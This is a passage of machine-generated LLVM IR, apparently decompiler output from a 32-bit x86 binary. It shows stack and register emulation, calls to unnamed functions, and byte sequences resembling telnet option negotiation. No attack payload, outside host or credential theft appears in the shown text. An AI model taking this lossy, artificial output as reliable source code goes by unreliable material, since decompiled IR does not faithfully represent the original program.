  %v4_804e8ec = inttoptr i32 %v3_804e8ec to i8*
  store i8 %v1_804e8ec, i8* %v4_804e8ec, align 1
  %v0_804e8f2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e8f2 = trunc i32 %v0_804e8f2 to i8
  %tmp307 = icmp ult i8 %v1_804e8f2, 10
  %v0_804ef7e = load i32, i32* @edi, align 4
  br i1 %tmp307, label %dec_label_pc_804ef7e, label %dec_label_pc_804e8fa

dec_label_pc_804e8fa:                             ; preds = %dec_label_pc_804e8cf
  %v1_804e8fa = add i32 %v0_804ef7e, 284
  %v2_804e8fa = inttoptr i32 %v1_804e8fa to i8*
  store i8 0, i8* %v2_804e8fa, align 1
  %v0_804e901 = load i32, i32* @edi, align 4
  %v1_804e901 = add i32 %v0_804e901, 12
  %v2_804e901 = inttoptr i32 %v1_804e901 to i32*
  store i32 0, i32* %v2_804e901, align 4
  br label %dec_label_pc_804e3b2

dec_label_pc_804e910:                             ; preds = %dec_label_pc_804e4d0
  store i8 -4, i8* %v1_804e4d0, align 1
  br label %dec_label_pc_804e4e2

dec_label_pc_804e918:                             ; preds = %dec_label_pc_804e4b6
  %v1_804e918 = add i32 %v0_804e918, 1863
  %v2_804e918 = inttoptr i32 %v1_804e918 to i8*
  store i8 -1, i8* %v2_804e918, align 1
  %v0_804e920 = load i32, i32* @esp, align 4
  %v1_804e920 = add i32 %v0_804e920, 1864
  %v2_804e920 = inttoptr i32 %v1_804e920 to i8*
  store i8 -5, i8* %v2_804e920, align 1
  %v0_804e928 = load i32, i32* @esp, align 4
  %v1_804e928 = add i32 %v0_804e928, 1865
  %v2_804e928 = inttoptr i32 %v1_804e928 to i8*
  store i8 31, i8* %v2_804e928, align 1
  %v0_804e930 = load i32, i32* @esp, align 4
  %v1_804e930 = add i32 %v0_804e930, 1831
  %v2_804e930 = inttoptr i32 %v1_804e930 to i8*
  store i8 -1, i8* %v2_804e930, align 1
  %v0_804e938 = load i32, i32* @esp, align 4
  %v1_804e938 = add i32 %v0_804e938, 1832
  %v2_804e938 = inttoptr i32 %v1_804e938 to i8*
  store i8 -6, i8* %v2_804e938, align 1
  %v0_804e940 = load i32, i32* @esp, align 4
  %v1_804e940 = add i32 %v0_804e940, 1833
  %v2_804e940 = inttoptr i32 %v1_804e940 to i8*
  store i8 31, i8* %v2_804e940, align 1
  %v0_804e948 = load i32, i32* @esp, align 4
  %v1_804e948 = add i32 %v0_804e948, 1834
  %v2_804e948 = inttoptr i32 %v1_804e948 to i8*
  store i8 0, i8* %v2_804e948, align 1
  %v0_804e950 = load i32, i32* @esp, align 4
  %v1_804e950 = add i32 %v0_804e950, 1835
  %v2_804e950 = inttoptr i32 %v1_804e950 to i8*
  store i8 80, i8* %v2_804e950, align 1
  %v0_804e958 = load i32, i32* @esp, align 4
  %v1_804e958 = add i32 %v0_804e958, 1836
  %v2_804e958 = inttoptr i32 %v1_804e958 to i8*
  store i8 0, i8* %v2_804e958, align 1
  %v0_804e960 = load i32, i32* @esp, align 4
  %v1_804e960 = add i32 %v0_804e960, 1837
  %v2_804e960 = inttoptr i32 %v1_804e960 to i8*
  store i8 24, i8* %v2_804e960, align 1
  %v0_804e968 = load i32, i32* @esp, align 4
  %v1_804e968 = add i32 %v0_804e968, 1838
  %v2_804e968 = inttoptr i32 %v1_804e968 to i8*
  store i8 -1, i8* %v2_804e968, align 1
  %v0_804e970 = load i32, i32* @esp, align 4
  %v1_804e970 = add i32 %v0_804e970, 1839
  %v2_804e970 = inttoptr i32 %v1_804e970 to i8*
  store i8 -16, i8* %v2_804e970, align 1
  %v0_804e978 = load i32, i32* @esp, align 4
  %v1_804e978 = add i32 %v0_804e978, 8
  %v2_804e978 = inttoptr i32 %v1_804e978 to i32*
  %v3_804e978 = load i32, i32* %v2_804e978, align 4
  store i32 %v3_804e978, i32* %eax.global-to-local, align 4
  %v0_804e97c = load i32, i32* @edi, align 4
  %v1_804e97c = add i32 %v0_804e97c, 24
  %v2_804e97c = inttoptr i32 %v1_804e97c to i32*
  %v3_804e97c = load i32, i32* %v2_804e97c, align 4
  %v0_804e97f = load i32, i32* @ebx, align 4
  %v1_804e97f = add i32 %v0_804e97f, 2
  store i32 %v1_804e97f, i32* %edx.global-to-local, align 4
  %v2_804e982 = add i32 %v3_804e97c, %v3_804e978
  store i32 %v2_804e982, i32* %eax.global-to-local, align 4
  %tmp308 = icmp ugt i32 %v2_804e982, %v1_804e97f
  br i1 %tmp308, label %dec_label_pc_804e98c, label %dec_label_pc_804e918.dec_label_pc_804e516.loopexit_crit_edge

dec_label_pc_804e918.dec_label_pc_804e516.loopexit_crit_edge: ; preds = %dec_label_pc_804e918
  %v0_804e516.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e516

dec_label_pc_804e98c:                             ; preds = %dec_label_pc_804e918
  %v2_804e98c = inttoptr i32 %v1_804e97f to i8*
  %v3_804e98c = load i8, i8* %v2_804e98c, align 1
  %v12_804e98c = icmp eq i8 %v3_804e98c, 31
  br i1 %v12_804e98c, label %dec_label_pc_804ef9a, label %dec_label_pc_804e996

dec_label_pc_804e996:                             ; preds = %dec_label_pc_804e98c
  %v1_804e996 = inttoptr i32 %v0_804e97f to i8*
  %v2_804e996 = load i8, i8* %v1_804e996, align 1
  %v3_804e996 = zext i8 %v2_804e996 to i32
  %v5_804e996 = and i32 %v2_804e982, -256
  %v6_804e996 = or i32 %v3_804e996, %v5_804e996
  store i32 %v6_804e996, i32* %eax.global-to-local, align 4
  %v11_804e998 = icmp eq i8 %v2_804e996, -3
  %v1_804e99a = icmp eq i1 %v11_804e998, false
  br i1 %v1_804e99a, label %dec_label_pc_804ef8a, label %dec_label_pc_804e9a0

dec_label_pc_804e9a0:                             ; preds = %dec_label_pc_804e996
  store i8 -4, i8* %v1_804e996, align 1
  br label %dec_label_pc_804e4d0

dec_label_pc_804e9a8:                             ; preds = %dec_label_pc_804e4e2
  store i8 -3, i8* %v2_804e4e2, align 1
  br label %dec_label_pc_804e4f5

dec_label_pc_804e9b1:                             ; preds = %dec_label_pc_804e4d0
  store i8 -3, i8* %v1_804e4d0, align 1
  br label %dec_label_pc_804e4e2

dec_label_pc_804e9b9:                             ; preds = %dec_label_pc_804e41c
  %v0_804e9b9 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804e9b9, i32* %edx.global-to-local, align 4
  %v1_804e9bb = load i32, i32* @esp, align 4
  %v2_804e9bb = add i32 %v1_804e9bb, -4
  %v3_804e9bb = inttoptr i32 %v2_804e9bb to i32*
  store i32 %v0_804e9b9, i32* %v3_804e9bb, align 4
  %v0_804e9bc = load i32, i32* @edi, align 4
  %v1_804e9bc = add i32 %v0_804e9bc, 92
  store i32 %v1_804e9bc, i32* %eax.global-to-local, align 4
  %v1_804e9bf = add i32 %v1_804e9bb, -8
  %v2_804e9bf = inttoptr i32 %v1_804e9bf to i32*
  store i32 192, i32* %v2_804e9bf, align 4
  %v0_804e9c4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e9c4 = add i32 %v1_804e9bb, -12
  %v3_804e9c4 = inttoptr i32 %v2_804e9c4 to i32*
  store i32 %v0_804e9c4, i32* %v3_804e9c4, align 4
  %v0_804e9c5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e9c5 = add i32 %v1_804e9bb, -16
  %v3_804e9c5 = inttoptr i32 %v2_804e9c5 to i32*
  store i32 %v0_804e9c5, i32* %v3_804e9c5, align 4
  %v4_804e9c6 = call i32 @function_8050015(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e9c6, i32* %eax.global-to-local, align 4
  %v0_804e9cb = load i32, i32* @edi, align 4
  %v1_804e9cb = add i32 %v0_804e9cb, 24
  %v2_804e9cb = inttoptr i32 %v1_804e9cb to i32*
  %v3_804e9cb = load i32, i32* %v2_804e9cb, align 4
  %v1_804e9ce = add i32 %v3_804e9cb, -64
  store i32 %v1_804e9ce, i32* %v2_804e9cb, align 4
  br label %dec_label_pc_804e430

dec_label_pc_804e9dc:                             ; preds = %dec_label_pc_804e57c, %dec_label_pc_804e57c, %dec_label_pc_804e57c, %dec_label_pc_804e57c
  %v1_804e9dc = add i32 %v0_804e9dc, 1
  store i32 %v1_804e9dc, i32* @esi, align 4
  %v10_804e9df = icmp eq i32 %v0_804e9dc, -2
  %v1_804e9e2 = icmp eq i1 %v10_804e9df, false
  br i1 %v1_804e9e2, label %dec_label_pc_804ecd2, label %dec_label_pc_804e9e8

dec_label_pc_804e9e8:                             ; preds = %dec_label_pc_804e5a4, %dec_label_pc_804e9dc, %dec_label_pc_804e570
  %v0_804e9e8 = load i32, i32* @esp, align 4
  %v1_804e9eb = add i32 %v0_804e9e8, -16
  %v2_804e9eb = inttoptr i32 %v1_804e9eb to i32*
  store i32 25, i32* %v2_804e9eb, align 4
  %v0_804e9ed = call i32 @function_804f150()
  store i32 %v0_804e9ed, i32* %eax.global-to-local, align 4
  %v0_804e9f2 = load i32, i32* @esp, align 4
  %v1_804e9f2 = inttoptr i32 %v0_804e9f2 to i32*
  %v2_804e9f2 = load i32, i32* %v1_804e9f2, align 4
  store i32 %v2_804e9f2, i32* %eax.global-to-local, align 4
  %v3_804e9f2 = add i32 %v0_804e9f2, 4
  %v1_804e9f3 = inttoptr i32 %v3_804e9f2 to i32*
  %v1_804e9f4 = add i32 %v0_804e9f2, 1864
  store i32 %v1_804e9f4, i32* %edx.global-to-local, align 4
  store i32 %v1_804e9f4, i32* %v1_804e9f3, align 4
  store i32 25, i32* %v1_804e9f2, align 4
  %v0_804e9fe = call i32 @function_804f0a0()
  store i32 %v0_804e9fe, i32* %eax.global-to-local, align 4
  %v0_804ea03 = load i32, i32* @esp, align 4
  %v1_804ea03 = add i32 %v0_804ea03, 1864
  %v2_804ea03 = inttoptr i32 %v1_804ea03 to i32*
  %v3_804ea03 = load i32, i32* %v2_804ea03, align 4
  %v1_804ea0a = add i32 %v3_804ea03, -1
  store i32 %v1_804ea0a, i32* %edx.global-to-local, align 4
  %v2_804ea0b = add i32 %v0_804ea03, -4
  %v3_804ea0b = inttoptr i32 %v2_804ea0b to i32*
  store i32 %v1_804ea0a, i32* %v3_804ea0b, align 4
  %v2_804ea0c = add i32 %v0_804ea03, -8
  %v3_804ea0c = inttoptr i32 %v2_804ea0c to i32*
  store i32 %v0_804e9fe, i32* %v3_804ea0c, align 4
  %v0_804ea0d = load i32, i32* @edi, align 4
  %v1_804ea0d = add i32 %v0_804ea0d, 24
  %v2_804ea0d = inttoptr i32 %v1_804ea0d to i32*
  %v3_804ea0d = load i32, i32* %v2_804ea0d, align 4
  store i32 %v3_804ea0d, i32* %eax.global-to-local, align 4
  %v2_804ea10 = add i32 %v0_804ea03, -12
  %v3_804ea10 = inttoptr i32 %v2_804ea10 to i32*
  store i32 %v3_804ea0d, i32* %v3_804ea10, align 4
  %v1_804ea11 = add i32 %v0_804ea03, 24
  %v2_804ea11 = inttoptr i32 %v1_804ea11 to i32*
  %v3_804ea11 = load i32, i32* %v2_804ea11, align 4
  store i32 %v3_804ea11, i32* %eax.global-to-local, align 4
  %v2_804ea15 = add i32 %v0_804ea03, -16
  %v3_804ea15 = inttoptr i32 %v2_804ea15 to i32*
  store i32 %v3_804ea11, i32* %v3_804ea15, align 4
  %v0_804ea16 = call i32 @function_804f640()
  %v0_804ea1b = load i32, i32* @esp, align 4
  %v8_804ea1e = icmp eq i32 %v0_804ea16, -1
  %v1_804ea1f = icmp eq i1 %v8_804ea1e, false
  %v2_804ea1f = zext i1 %v1_804ea1f to i32
  %v2_804ea22 = icmp eq i1 %v1_804ea1f, false
  store i32 %v2_804ea1f, i32* %eax.global-to-local, align 4
  store i32 %v2_804ea1f, i32* @esi, align 4
  %v1_804efde = add i32 %v0_804ea1b, 16
  %v2_804efde = inttoptr i32 %v1_804efde to i32*
  store i32 25, i32* %v2_804efde, align 4
  %v0_804efe0 = call i32 @function_804f0d0()
  store i32 %v0_804efe0, i32* %eax.global-to-local, align 4
  br i1 %v2_804ea22, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804ea31

dec_label_pc_804ea31:                             ; preds = %dec_label_pc_804e9e8
  %v0_804ea3e = load i32, i32* @esi, align 4
  %v10_804ea3e = icmp eq i32 %v0_804ea3e, -1
  br i1 %v10_804ea3e, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804ea47

dec_label_pc_804ea47:                             ; preds = %dec_label_pc_804ea31, %dec_label_pc_804ecd2
  %v0_804ea47 = phi i32 [ %v0_804ea3e, %dec_label_pc_804ea31 ], [ %v0_804ea47.pre, %dec_label_pc_804ecd2 ]
  %v0_804ea4f.in = load i32, i32* @esp, align 4
  %tmp140 = icmp slt i32 %v0_804ea47, 1
  br i1 %tmp140, label %dec_label_pc_804ea89, label %dec_label_pc_804ea4b

dec_label_pc_804ea4b:                             ; preds = %dec_label_pc_804ea47
  %v0_804ea4b = load i32, i32* @edi, align 4
  %v1_804ea4b = inttoptr i32 %v0_804ea4b to i32*
  %v2_804ea4b = load i32, i32* %v1_804ea4b, align 4
  store i32 %v2_804ea4b, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ea4f = add i32 %v0_804ea4f.in, 12
  %v2_804ea4f = inttoptr i32 %v1_804ea4f to i32*
  store i32 16384, i32* %v2_804ea4f, align 4
  %v0_804ea54 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ea54 = add i32 %v0_804ea54, 13
  %v2_804ea54 = inttoptr i32 %v1_804ea54 to i8*
  %v3_804ea54 = load i8, i8* %v2_804ea54, align 1
  %v4_804ea54 = zext i8 %v3_804ea54 to i32
  %v5_804ea54 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ea54 = and i32 %v5_804ea54, -256
  %v7_804ea54 = or i32 %v6_804ea54, %v4_804ea54
  store i32 %v7_804ea54, i32* %eax.global-to-local, align 4
  %v2_804ea57 = add i32 %v0_804ea4f.in, 8
  %v3_804ea57 = inttoptr i32 %v2_804ea57 to i32*
  store i32 %v7_804ea54, i32* %v3_804ea57, align 4
  %v0_804ea58 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ea58 = add i32 %v0_804ea58, 4
  %v2_804ea58 = inttoptr i32 %v1_804ea58 to i32*
  %v3_804ea58 = load i32, i32* %v2_804ea58, align 4
  %v2_804ea5b = add i32 %v0_804ea4f.in, 4
  %v3_804ea5b = inttoptr i32 %v2_804ea5b to i32*
  store i32 %v3_804ea58, i32* %v3_804ea5b, align 4
  %v0_804ea5c = load i32, i32* @edi, align 4
  %v1_804ea5c = add i32 %v0_804ea5c, 4
  %v2_804ea5c = inttoptr i32 %v1_804ea5c to i32*
  %v3_804ea5c = load i32, i32* %v2_804ea5c, align 4
  store i32 %v3_804ea5c, i32* @ebx, align 4
  %v3_804ea5f = inttoptr i32 %v0_804ea4f.in to i32*
  store i32 %v3_804ea5c, i32* %v3_804ea5f, align 4
  %v0_804ea60 = call i32 @function_80501e6()
  store i32 %v0_804ea60, i32* %eax.global-to-local, align 4
  %v0_804ea65 = load i32, i32* @esp, align 4
  %v1_804ea65 = add i32 %v0_804ea65, -4
  %v2_804ea65 = inttoptr i32 %v1_804ea65 to i32*
  store i32 16384, i32* %v2_804ea65, align 4
  %v1_804ea6a = add i32 %v0_804ea65, -8
  %v2_804ea6a = inttoptr i32 %v1_804ea6a to i32*
  store i32 2, i32* %v2_804ea6a, align 4
  %v1_804ea6c = add i32 %v0_804ea65, -12
  %v2_804ea6c = inttoptr i32 %v1_804ea6c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80523f9.22 to i32), i32* %v2_804ea6c, align 4
  %v0_804ea71 = load i32, i32* @edi, align 4
  %v1_804ea71 = add i32 %v0_804ea71, 4
  %v2_804ea71 = inttoptr i32 %v1_804ea71 to i32*
  %v3_804ea71 = load i32, i32* %v2_804ea71, align 4
  store i32 %v3_804ea71, i32* %ecx.global-to-local, align 4
  %v2_804ea74 = add i32 %v0_804ea65, -16
  %v3_804ea74 = inttoptr i32 %v2_804ea74 to i32*
  store i32 %v3_804ea71, i32* %v3_804ea74, align 4
  %v0_804ea75 = call i32 @function_80501e6()
  store i32 %v0_804ea75, i32* %eax.global-to-local, align 4
  %v0_804ea7d = load i32, i32* @edi, align 4
  %v1_804ea7d = add i32 %v0_804ea7d, 12
  %v2_804ea7d = inttoptr i32 %v1_804ea7d to i32*
  store i32 5, i32* %v2_804ea7d, align 4
  br label %dec_label_pc_804e778

dec_label_pc_804ea89:                             ; preds = %dec_label_pc_804e832, %dec_label_pc_804ed69, %dec_label_pc_804ec84, %dec_label_pc_804e68a, %dec_label_pc_804eaa2, %dec_label_pc_804ecf0, %dec_label_pc_804ea47, %dec_label_pc_804ebcd, %dec_label_pc_804e516
  %v0_804ea89 = phi i32 [ %v1_804e826179, %dec_label_pc_804e832 ], [ %v1_804ed5d, %dec_label_pc_804ed69 ], [ %v0_804ec7b, %dec_label_pc_804ec84 ], [ %v1_804e67e176, %dec_label_pc_804e68a ], [ %v1_804ea96, %dec_label_pc_804eaa2 ], [ %v1_804ece4, %dec_label_pc_804ecf0 ], [ %v0_804ea47, %dec_label_pc_804ea47 ], [ %v0_804ebcd, %dec_label_pc_804ebcd ], [ %v0_804e516, %dec_label_pc_804e516 ]
  %v1_804ea89 = icmp eq i32 %v0_804ea89, 0
  %v1_804ea8b = icmp eq i1 %v1_804ea89, false
  br i1 %v1_804ea8b, label %dec_label_pc_804e778, label %dec_label_pc_804e415.backedge

dec_label_pc_804ea96:                             ; preds = %dec_label_pc_804e601, %dec_label_pc_804e601, %dec_label_pc_804e601, %dec_label_pc_804e601, %dec_label_pc_804e601
  %v1_804ea96 = add i32 %v0_804ea96, 1
  store i32 %v1_804ea96, i32* @esi, align 4
  %v10_804ea99 = icmp eq i32 %v0_804ea96, -2
  br i1 %v10_804ea99, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804eaa2

dec_label_pc_804eaa2:                             ; preds = %dec_label_pc_804ea96
  %tmp141 = icmp slt i32 %v1_804ea96, 1
  br i1 %tmp141, label %dec_label_pc_804ea89, label %dec_label_pc_804eaa6

dec_label_pc_804eaa6:                             ; preds = %dec_label_pc_804eaa2
  %v0_804eaa6 = load i32, i32* @esp, align 4
  %v1_804eaa9 = add i32 %v0_804eaa6, -16
  %v2_804eaa9 = inttoptr i32 %v1_804eaa9 to i32*
  store i32 7, i32* %v2_804eaa9, align 4
  %v0_804eaab = call i32 @function_804f150()
  store i32 %v0_804eaab, i32* %eax.global-to-local, align 4
  %v0_804eab0 = load i32, i32* @esp, align 4
  %v1_804eab0 = inttoptr i32 %v0_804eab0 to i32*
  %v2_804eab0 = load i32, i32* %v1_804eab0, align 4
  store i32 %v2_804eab0, i32* %eax.global-to-local, align 4
  %v3_804eab0 = add i32 %v0_804eab0, 4
  %v1_804eab1 = inttoptr i32 %v3_804eab0 to i32*
  %v2_804eab1 = load i32, i32* %v1_804eab1, align 4
  store i32 %v2_804eab1, i32* %edx.global-to-local, align 4
  %v1_804eab2 = add i32 %v0_804eab0, 1864
  store i32 %v1_804eab2, i32* %eax.global-to-local, align 4
  store i32 %v1_804eab2, i32* %v1_804eab1, align 4
  store i32 7, i32* %v1_804eab0, align 4
  %v0_804eabc = call i32 @function_804f0a0()
  store i32 %v0_804eabc, i32* %eax.global-to-local, align 4
  %v0_804eac1 = load i32, i32* @esp, align 4
  %v1_804eac1 = add i32 %v0_804eac1, -4
  %v2_804eac1 = inttoptr i32 %v1_804eac1 to i32*
  store i32 16384, i32* %v2_804eac1, align 4
  %v1_804eac6 = add i32 %v0_804eac1, 1864
  %v2_804eac6 = inttoptr i32 %v1_804eac6 to i32*
  %v3_804eac6 = load i32, i32* %v2_804eac6, align 4
  %v2_804eacd = add i32 %v0_804eac1, -8
  %v3_804eacd = inttoptr i32 %v2_804eacd to i32*
  store i32 %v3_804eac6, i32* %v3_804eacd, align 4
  %v2_804eace = add i32 %v0_804eac1, -12
  %v3_804eace = inttoptr i32 %v2_804eace to i32*
  store i32 %v0_804eabc, i32* %v3_804eace, align 4
  %v0_804eacf = load i32, i32* @edi, align 4
  %v1_804eacf = add i32 %v0_804eacf, 4
  %v2_804eacf = inttoptr i32 %v1_804eacf to i32*
  %v3_804eacf = load i32, i32* %v2_804eacf, align 4
  store i32 %v3_804eacf, i32* @ebx, align 4
  %v2_804ead2 = add i32 %v0_804eac1, -16
  %v3_804ead2 = inttoptr i32 %v2_804ead2 to i32*
  store i32 %v3_804eacf, i32* %v3_804ead2, align 4
  %v0_804ead3 = call i32 @function_80501e6()
  store i32 %v0_804ead3, i32* %eax.global-to-local, align 4
  %v0_804ead8 = load i32, i32* @esp, align 4
  %v1_804eadb = add i32 %v0_804ead8, 28
  %v2_804eadb = inttoptr i32 %v1_804eadb to i32*
  store i32 16384, i32* %v2_804eadb, align 4
  %v1_804eae0 = add i32 %v0_804ead8, 24
  %v2_804eae0 = inttoptr i32 %v1_804eae0 to i32*
  store i32 2, i32* %v2_804eae0, align 4
  %v1_804eae2 = add i32 %v0_804ead8, 20
  %v2_804eae2 = inttoptr i32 %v1_804eae2 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80523f9.22 to i32), i32* %v2_804eae2, align 4
  %v0_804eae7 = load i32, i32* @edi, align 4
  %v1_804eae7 = add i32 %v0_804eae7, 4
  %v2_804eae7 = inttoptr i32 %v1_804eae7 to i32*
  %v3_804eae7 = load i32, i32* %v2_804eae7, align 4
  store i32 %v3_804eae7, i32* %ecx.global-to-local, align 4
  %v2_804eaea = add i32 %v0_804ead8, 16
  %v3_804eaea = inttoptr i32 %v2_804eaea to i32*
  store i32 %v3_804eae7, i32* %v3_804eaea, align 4
  %v0_804eaeb = call i32 @function_80501e6()
  store i32 %v0_804eaeb, i32* %eax.global-to-local, align 4
  %v0_804eaf0 = load i32, i32* @esp, align 4
  %v1_804eaf0 = inttoptr i32 %v0_804eaf0 to i32*
  store i32 7, i32* %v1_804eaf0, align 4
  %v0_804eaf7 = call i32 @function_804f0d0()
  store i32 %v0_804eaf7, i32* %eax.global-to-local, align 4
  %v0_804eaff = load i32, i32* @edi, align 4
  %v1_804eaff = add i32 %v0_804eaff, 12
  %v2_804eaff = inttoptr i32 %v1_804eaff to i32*
  store i32 9, i32* %v2_804eaff, align 4
  br label %dec_label_pc_804e778

dec_label_pc_804eb0b:                             ; preds = %dec_label_pc_804e536, %dec_label_pc_804e536, %dec_label_pc_804e536, %dec_label_pc_804e536, %dec_label_pc_804e536
  %v1_804eb0b = add i32 %v0_804eb0b, 1
  store i32 %v1_804eb0b, i32* @esi, align 4
  %v10_804eb0e = icmp eq i32 %v0_804eb0b, -2
  %v1_804eb11 = icmp eq i1 %v10_804eb0e, false
  br i1 %v1_804eb11, label %dec_label_pc_804ec12, label %dec_label_pc_804eb17

dec_label_pc_804eb17:                             ; preds = %dec_label_pc_804e567, %dec_label_pc_804eb0b, %dec_label_pc_804e52a
  %v0_804eb17 = load i32, i32* @esp, align 4
  %v1_804eb1a = add i32 %v0_804eb17, -16
  %v2_804eb1a = inttoptr i32 %v1_804eb1a to i32*
  store i32 26, i32* %v2_804eb1a, align 4
  %v0_804eb1c = call i32 @function_804f150()
  store i32 %v0_804eb1c, i32* %eax.global-to-local, align 4
  %v0_804eb21 = load i32, i32* @esp, align 4
  %v1_804eb21 = inttoptr i32 %v0_804eb21 to i32*
  store i32 27, i32* %v1_804eb21, align 4
  %v0_804eb28 = call i32 @function_804f150()
  store i32 %v0_804eb28, i32* %eax.global-to-local, align 4
  %v0_804eb2d = load i32, i32* @esp, align 4
  %v1_804eb2d = inttoptr i32 %v0_804eb2d to i32*
  %v2_804eb2d = load i32, i32* %v1_804eb2d, align 4
  store i32 %v2_804eb2d, i32* %ecx.global-to-local, align 4
  %v3_804eb2d = add i32 %v0_804eb2d, 4
  %v1_804eb2e = inttoptr i32 %v3_804eb2d to i32*
  %v2_804eb2e = load i32, i32* %v1_804eb2e, align 4
  store i32 %v2_804eb2e, i32* %ebx.global-to-local, align 4
  %v1_804eb2f = add i32 %v0_804eb2d, 1864
  store i32 %v1_804eb2f, i32* %ecx.global-to-local, align 4
  store i32 %v1_804eb2f, i32* %v1_804eb2e, align 4
  store i32 26, i32* %v1_804eb2d, align 4
  %v0_804eb39 = call i32 @function_804f0a0()
  store i32 %v0_804eb39, i32* %eax.global-to-local, align 4
  store i32 %v0_804eb39, i32* @ebx, align 4
  %v0_804eb40 = load i32, i32* @esp, align 4
  %v1_804eb40 = inttoptr i32 %v0_804eb40 to i32*
  %v2_804eb40 = load i32, i32* %v1_804eb40, align 4
  store i32 %v2_804eb40, i32* %eax.global-to-local, align 4
  %v3_804eb40 = add i32 %v0_804eb40, 4
  %v1_804eb41 = inttoptr i32 %v3_804eb40 to i32*
  %v2_804eb41 = load i32, i32* %v1_804eb41, align 4
  store i32 %v2_804eb41, i32* %edx.global-to-local, align 4
  %v1_804eb42 = add i32 %v0_804eb40, 1864
  store i32 %v1_804eb42, i32* %eax.global-to-local, align 4
  store i32 %v1_804eb42, i32* %v1_804eb41, align 4
  store i32 27, i32* %v1_804eb40, align 4
  %v0_804eb4c = call i32 @function_804f0a0()
  store i32 %v0_804eb4c, i32* %eax.global-to-local, align 4
  store i32 %v0_804eb4c, i32* @ebp, align 4
  %v0_804eb53 = load i32, i32* @esp, align 4
  %v1_804eb53 = add i32 %v0_804eb53, 1864
  %v2_804eb53 = inttoptr i32 %v1_804eb53 to i32*
  %v3_804eb53 = load i32, i32* %v2_804eb53, align 4
  %v1_804eb5a = add i32 %v3_804eb53, -1
  store i32 %v1_804eb5a, i32* %eax.global-to-local, align 4
  %v2_804eb5b = add i32 %v0_804eb53, -4
  %v3_804eb5b = inttoptr i32 %v2_804eb5b to i32*
  store i32 %v1_804eb5a, i32* %v3_804eb5b, align 4
  %v0_804eb5c = load i32, i32* @ebx, align 4
  %v2_804eb5c = add i32 %v0_804eb53, -8
  %v3_804eb5c = inttoptr i32 %v2_804eb5c to i32*
  store i32 %v0_804eb5c, i32* %v3_804eb5c, align 4
  %v0_804eb5d = load i32, i32* @edi, align 4
  %v1_804eb5d = add i32 %v0_804eb5d, 24
  %v2_804eb5d = inttoptr i32 %v1_804eb5d to i32*
  %v3_804eb5d = load i32, i32* %v2_804eb5d, align 4
  store i32 %v3_804eb5d, i32* %eax.global-to-local, align 4
  %v2_804eb60 = add i32 %v0_804eb53, -12
  %v3_804eb60 = inttoptr i32 %v2_804eb60 to i32*
  store i32 %v3_804eb5d, i32* %v3_804eb60, align 4
  %v1_804eb61 = add i32 %v0_804eb53, 24
  %v2_804eb61 = inttoptr i32 %v1_804eb61 to i32*
  %v3_804eb61 = load i32, i32* %v2_804eb61, align 4
  store i32 %v3_804eb61, i32* %eax.global-to-local, align 4
  %v2_804eb65 = add i32 %v0_804eb53, -16
  %v3_804eb65 = inttoptr i32 %v2_804eb65 to i32*
  store i32 %v3_804eb61, i32* %v3_804eb65, align 4
  %v0_804eb66 = call i32 @function_804f640()
  %v0_804eb6b = load i32, i32* @esp, align 4
  %v1_804eb6b = add i32 %v0_804eb6b, 32
  %v8_804eb6e = icmp eq i32 %v0_804eb66, -1
  %v1_804eb6f = icmp eq i1 %v8_804eb6e, false
  %v2_804eb6f = zext i1 %v1_804eb6f to i32
  %v2_804eb72 = icmp eq i1 %v1_804eb6f, false
  store i32 %v2_804eb6f, i32* %eax.global-to-local, align 4
  store i32 %v2_804eb6f, i32* @esi, align 4
  %v1_804eb7b = icmp eq i1 %v2_804eb72, false
  br i1 %v1_804eb7b, label %dec_label_pc_804ebab, label %dec_label_pc_804eb7d

dec_label_pc_804eb7d:                             ; preds = %dec_label_pc_804eb17
  %v1_804eb7d = add i32 %v0_804eb6b, 1880
  %v2_804eb7d = inttoptr i32 %v1_804eb7d to i32*
  %v3_804eb7d = load i32, i32* %v2_804eb7d, align 4
  %v1_804eb84 = add i32 %v3_804eb7d, -1
  store i32 %v1_804eb84, i32* %eax.global-to-local, align 4
  %v2_804eb85 = add i32 %v0_804eb6b, 28
  %v3_804eb85 = inttoptr i32 %v2_804eb85 to i32*
  store i32 %v1_804eb84, i32* %v3_804eb85, align 4
  %v0_804eb86 = load i32, i32* @ebp, align 4
  %v2_804eb86 = add i32 %v0_804eb6b, 24
  %v3_804eb86 = inttoptr i32 %v2_804eb86 to i32*
  store i32 %v0_804eb86, i32* %v3_804eb86, align 4
  %v0_804eb87 = load i32, i32* @edi, align 4
  %v1_804eb87 = add i32 %v0_804eb87, 24
  %v2_804eb87 = inttoptr i32 %v1_804eb87 to i32*
  %v3_804eb87 = load i32, i32* %v2_804eb87, align 4
  store i32 %v3_804eb87, i32* %eax.global-to-local, align 4
  %v2_804eb8a = add i32 %v0_804eb6b, 20
  %v3_804eb8a = inttoptr i32 %v2_804eb8a to i32*
  store i32 %v3_804eb87, i32* %v3_804eb8a, align 4
  %v1_804eb8b = add i32 %v0_804eb6b, 40
  %v2_804eb8b = inttoptr i32 %v1_804eb8b to i32*
  %v3_804eb8b = load i32, i32* %v2_804eb8b, align 4
  store i32 %v3_804eb8b, i32* %eax.global-to-local, align 4
  %v2_804eb8f = add i32 %v0_804eb6b, 16
  %v3_804eb8f = inttoptr i32 %v2_804eb8f to i32*
  store i32 %v3_804eb8b, i32* %v3_804eb8f, align 4
  %v0_804eb90 = call i32 @function_804f640()
  %v0_804eb95 = load i32, i32* @esp, align 4
  %v1_804eb95 = add i32 %v0_804eb95, 16
  %v8_804eb98 = icmp eq i32 %v0_804eb90, -1
  %v1_804eb99 = icmp eq i1 %v8_804eb98, false
